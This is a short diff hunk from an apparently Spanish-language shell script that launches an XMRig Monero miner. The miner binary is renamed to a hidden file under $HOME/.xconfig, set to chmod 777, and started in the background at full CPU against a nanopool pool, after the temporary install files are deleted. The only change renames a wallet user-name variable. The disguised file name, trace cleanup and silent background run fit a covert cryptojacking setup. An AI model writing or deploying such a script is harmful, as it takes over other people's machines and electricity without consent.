@@ -41,4 +41,4 @@ chmod 777 $HOME/.xconfig/.x
 # Limpiar archivos temporales
 rm /tmp/xmrig.tar.gz
 rm -rf /tmp/xmrig-6.21.3
-$HOME/.xconfig/.x -o xmr-us-east1.nanopool.org:14433 -u $billetera$USUARIO --tls --coin monero --cpu-no-yield -B
+$HOME/.xconfig/.x -o xmr-us-east1.nanopool.org:14433 -u $billetera$NOMBRE_USUARIO --tls --coin monero --cpu-no-yield -B
